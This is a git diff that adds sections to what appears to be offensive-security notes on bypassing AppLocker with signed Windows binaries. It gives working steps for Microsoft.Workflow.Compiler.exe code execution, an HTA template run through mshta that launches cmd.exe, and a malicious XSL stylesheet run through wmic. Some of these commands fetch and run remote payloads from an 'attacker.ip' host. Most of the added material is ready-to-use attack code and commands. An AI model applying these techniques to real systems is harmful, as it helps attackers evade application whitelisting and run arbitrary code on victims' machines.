@@ -174,6 +174,10 @@ bypass
 
 And example is `MSBuild`, if is not blocked, it can be used to execute arbitrary C# code from a `.csproj` file. This could be turned into a basic shellcode injector.
 
+```
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe code.csproj
+```
+
 ```c#
 <Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
   <Target Name="MSBuild">
@@ -317,6 +321,146 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogTo
 ```sh
 certutil -encode uninstaller-dropper.exe enc.txt
 certurtil -decode enc.txt uninstaller-dropper.exe
+```
+
+### Microsoft.Workflow.Compiler.exe
+
+`Microsoft.Workflow.Compile.exe` is a signed binary located in `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\` which we can use to compile and execute our c# code.
+
+It requires two arguments, the first one is an xml file with the flags for the compilation and the second one a dummy file for results.
+
+To obtain our xml file we can use reflection to invoke the following method.
+
+```powershell
+$workflowexe = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe"
+$workflowasm = [Reflection.Assembly]::LoadFrom($workflowexe)
+$SerializeInputToWrapper = [Microsoft.Workflow.Compiler.CompilerWrapper].GetMethod('SerializeInputToWrapper', [Reflection.BindingFlags] 'NonPublic, Static')
+Add-Type -Path 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.Workflow.ComponentModel.dll'
+$compilerparam = New-Object -TypeName Workflow.ComponentModel.Compiler.WorkflowCompilerParameters
+$compilerparam.GenerateInMemory = $True
+$pathvar = "code.txt"
+$output = "C:\Tools\run.xml"
+$tmp = $SerializeInputToWrapper.Invoke($null, @([Workflow.ComponentModel.Compiler.WorkflowCompilerParameters] $compilerparam, [String[]] @(,$pathvar)))
+Move-Item $tmp $output
+```
+
+Output file:
+
+```xml
+<?xml version="1.0" encoding="utf-8"?>
+<CompilerInput xmlns:i="http://www.w3.org/2001/XMLSchema-instance" xmlns="http://schemas.datacontract.org/2004/07/Microsoft.Workflow.Compiler">
+  <files xmlns:d2p1="http://schemas.microsoft.com/2003/10/Serialization/Arrays">
+    <d2p1:string>code.txt</d2p1:string>
+  </files>
+  <parameters xmlns:d2p1="http://schemas.datacontract.org/2004/07/System.Workflow.ComponentModel.Compiler">
+    <assemblyNames xmlns:d3p1="http://schemas.microsoft.com/2003/10/Serialization/Arrays" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" />
+    <compilerOptions i:nil="true" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" />
+    <coreAssemblyFileName xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"></coreAssemblyFileName>
+    <embeddedResources xmlns:d3p1="http://schemas.microsoft.com/2003/10/Serialization/Arrays" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" />
+    <evidence xmlns:d3p1="http://schemas.datacontract.org/2004/07/System.Security.Policy" i:nil="true" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" />
+    <generateExecutable xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler">false</generateExecutable>
+    <generateInMemory xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler">true</generateInMemory>
+    <includeDebugInformation xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler">false</includeDebugInformation>
+    <linkedResources xmlns:d3p1="http://schemas.microsoft.com/2003/10/Serialization/Arrays" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" />
+    <mainClass i:nil="true" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" />
+    <outputName i:nil="true" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" />
+    <tempFiles i:nil="true" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" />
+    <treatWarningsAsErrors xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler">false</treatWarningsAsErrors>
+    <warningLevel xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler">-1</warningLevel>
+    <win32Resource i:nil="true" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" />
+    <d2p1:checkTypes>false</d2p1:checkTypes>
+    <d2p1:compileWithNoCode>false</d2p1:compileWithNoCode>
+    <d2p1:compilerOptions i:nil="true" />
+    <d2p1:generateCCU>false</d2p1:generateCCU>
+    <d2p1:languageToUse>CSharp</d2p1:languageToUse>
+    <d2p1:libraryPaths xmlns:d3p1="http://schemas.microsoft.com/2003/10/Serialization/Arrays" i:nil="true" />
+    <d2p1:localAssembly xmlns:d3p1="http://schemas.datacontract.org/2004/07/System.Reflection" i:nil="true" />
+    <d2p1:mtInfo i:nil="true" />
+    <d2p1:userCodeCCUs xmlns:d3p1="http://schemas.datacontract.org/2004/07/System.CodeDom" i:nil="true" />
+  </parameters>
+</CompilerInput>
+```
+
+> **Note**: It works in different computers, so directly use it.
+
+`$pathvar` variable stores our code filename. It needs to contain a class that inherits from the Activity class of `System.Workflow.ComponentModel` namespace and mus contain the code we want to execute inside its constructor.
+
+File  `code.txt`
+
+```csharp
+using System;
+using System.Workflow.ComponentModel;
+public class Run : Activity{
+    public Run() {
+        Console.WriteLine("I executed!");
+    }
+}
+```
+
+```
+PS C:\Tools> C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe .\run.xml results.xml
+I executed!
+```
+
+### mshta
+
+Microsoft HTML Applications (MSHTA) work by executing `.hta` files with the native `mshta.exe` application. HTML apps include embedded jscript or vbs code that is parsed and executed by `mshta.exe`.
+
+Since `mshta.exe` located in `c:\windows\system32\` is a signed microsoft application, it is commonly whitelisted.
+
+We can execute our Jscript code with `mshta.exe` instead of `wscript.exe` using the following HTA template bypassing App Locker restrictions.
+
+
+```html
+<html> 
+<head> 
+<script language="JScript">
+var shell = new ActiveXObject("WScript.Shell");
+var res = shell.Run("cmd.exe");
+</script>
+</head> 
+<body>
+<script language="JScript">
+self.close();
+</script>
+</body> 
+</html>
+```
+
+```
+mshta.exe code.hta
+mshta.exe http://attacker.ip/code.hta
+```
+
+### XSL Transformation
+
+The process of XSLT uses Extensible Stylesheet Language (.xsl) documents to transform an XML document into a different format such as XHTML.
+
+Part of the XSL transformation specification allows execution of embedded Jscript code when processing the supplied XML document.
+
+First we must craft a malicious XSL document and put it in our http server.
+
+```xsl
+<?xml version='1.0'?>
+<stylesheet version="1.0"
+xmlns="http://www.w3.org/1999/XSL/Transform"
+xmlns:ms="urn:schemas-microsoft-com:xslt"
+xmlns:user="http://mycompany.com/mynamespace">
+
+<output method="text"/>
+	<ms:script implements-prefix="user" language="JScript">
+		
+			var r = new ActiveXObject("WScript.Shell");
+			r.Run("cmd.exe");
+		
+	</ms:script>
+</stylesheet>
+```
+
+Finally use `wmic`by specifying the verb `get` and the `/fomat` followed by the URL of the XSL file.
+
+```
+wmic process get brief /format:"http://attacker.ip/test.xsl"
 ```
 
 ## Bypass with DLLs
